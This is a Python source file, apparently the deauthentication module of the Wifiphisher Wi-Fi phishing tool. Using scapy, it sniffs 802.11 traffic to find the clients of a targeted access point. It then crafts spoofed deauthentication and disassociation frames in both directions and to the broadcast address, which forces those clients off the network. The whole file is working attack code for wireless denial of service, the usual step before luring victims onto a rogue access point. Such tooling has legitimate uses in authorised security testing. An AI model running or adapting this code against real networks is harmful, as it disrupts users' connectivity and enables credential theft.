"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants


class Deauth(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, data):
        """
        Setup the class with all the given arguments.

        :param self: A Deauthentication object.
        :param data: Shared data from main engine
        :type self: Deauthentication
        :type data: dictionary
        :return: None
        :rtype: None
        """

        self._observed_clients = list()
        self._deauthentication_packets = list()
        self._should_continue = True
        self._non_client_addresses = constants.NON_CLIENT_ADDRESSES
        self._data = data

        # Craft and add deauth/disas packet to broadcast address
        self.packets_to_send = self._craft_packet(
            self._data.target_ap_bssid,
            constants.WIFI_BROADCAST)

    def _craft_packet(self, sender, receiver):
        """
        Craft a deauthentication and a disassociation packet and add
        them to the list of deauthentication packets

        :param self: A Deauthentication object
        :param sender: The MAC address of the sender
        :param receiver: The MAC address of the receiver
        :type self: Deauthentication
        :type sender: string
        :type receiver: string
        :return: None
        :rtype: None
        """

        deauth_packet = (
            dot11.RadioTap() /
            dot11.Dot11(
                type=0,
                subtype=12,
                addr1=receiver,
                addr2=sender,
                addr3=self._data.target_ap_bssid) /
            dot11.Dot11Deauth())

        disassoc_packet = (
            dot11.RadioTap() /
            dot11.Dot11(
                type=0,
                subtype=10,
                addr1=receiver,
                addr2=sender,
                addr3=self._data.target_ap_bssid) /
            dot11.Dot11Disas())

        return [disassoc_packet, deauth_packet]

    def get_packet(self, packet):
        """
        Process the Dot11 packets and add any desired clients to observed_clients.

        :param self: A Deauthentication object.
        :param packet: A scapy.layers.RadioTap object.
        :type self: Deauthentication
        :type packet: scapy.layers.RadioTap
        :return: list with the crafted Deauth/Disas packets
        :rtype: list
        .. note: addr1 = Destination address
                 addr2 = Sender address
                 Also this finds devices that are not associated with any
                 access point as they respond to the access point probes.
        """

        deauth_pkts = []

        # check if the packet has a dot11 layer
        if packet.haslayer(dot11.Dot11):
            # get the sender and receiver
            receiver = packet.addr1
            sender = packet.addr2

            # create a list of addresses that are not acceptable
            non_valid_list = self._non_client_addresses + self._observed_clients

            # if sender or receirver is valid and not already a
            # discovered client check to see if either one is a client
            if receiver not in non_valid_list and sender not in non_valid_list:
                # in case the receiver is the access point
                if receiver == self._data.target_ap_bssid:
                    # add the sender to the client list
                    self._observed_clients.append(sender)

                    # create and add deauthentication packets for client
                    self.packets_to_send += self._craft_packet(
                        sender, self._data.target_ap_bssid)
                    self.packets_to_send += self._craft_packet(
                        self._data.target_ap_bssid, sender)

                # in case the sender is the access point
                elif sender == self._data.target_ap_bssid:
                    # add the receiver to the client list
                    self._observed_clients.append(receiver)

                    # create and add deauthentication packets for client
                    self.packets_to_send += self._craft_packet(
                        receiver, self._data.target_ap_bssid)
                    self.packets_to_send += self._craft_packet(
                        self._data.target_ap_bssid, receiver)

        return ([self._data.target_ap_channel], self.packets_to_send)

    def send_output(self):
        """
        Get all the observed clients.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: A list with all the Deauth/Disas entries.
        :rtype: list
        """

        return ["DEAUTH/DISAS - " + c for c in self._observed_clients]

    def send_channels(self):
        """
        Send channes to subscribe.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: A list with all interested channels.
        :rtype: list
        """

        return [self._data.target_ap_channel]
